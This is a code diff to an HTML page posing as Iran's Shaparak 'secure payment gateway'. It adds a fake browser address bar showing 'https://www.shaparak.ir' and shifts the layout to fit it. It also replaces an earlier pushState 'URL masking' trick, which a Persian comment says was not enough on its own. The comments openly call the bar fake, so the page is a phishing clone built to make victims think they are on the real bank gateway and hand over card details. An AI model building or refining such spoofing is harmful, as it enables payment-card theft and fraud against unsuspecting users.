@@ -36,13 +36,38 @@
             z-index: 9999;
             pointer-events: none;
         }
+        .fake-address-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #f1f1f1;
+            padding: 5px 10px;
+            font-size: 14px;
+            color: #333;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .fake-address-bar span {
+            background: #fff;
+            padding: 5px 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            direction: ltr;
+            text-align: left;
+            width: 80%;
+            max-width: 800px;
+        }
         header {
             background: var(--primary);
             color: #fff;
             padding: 20px;
             text-align: center;
             position: fixed;
-            top: 0;
+            top: 30px; /* جابجایی به خاطر نوار آدرس جعلی */
             width: 100%;
             z-index: 100;
             box-shadow: var(--shadow);
@@ -53,7 +78,7 @@
         }
         .progress-container {
             max-width: 700px;
-            margin: 80px auto 20px;
+            margin: 110px auto 20px; /* تنظیم فاصله به خاطر نوار جعلی */
             background: #fff;
             padding: 8px;
             border-radius: 25px;
@@ -220,6 +245,11 @@
     </style>
 </head>
 <body>
+    <!-- نوار آدرس جعلی -->
+    <div class="fake-address-bar">
+        <span>https://www.shaparak.ir</span>
+    </div>
+
     <header>
         <img src="https://via.placeholder.com/50?text=شاپرک" alt="شاپرک">
         <h1>درگاه پرداخت امن شاپرک</h1>
@@ -304,8 +334,7 @@
             ];
 
             function init() {
-                // اعمال URL Masking برای نمایش آدرس جعلی شاپرک
-                window.history.pushState({}, document.title, 'https://www.shaparak.ir');
+                // اینجا دیگه pushState رو حذف کردم چون به تنهایی کافی نبود
                 setupInputs();
                 updateProgress();
                 if (!localStorage.getItem(`specialMode_${sessionId}`)) {
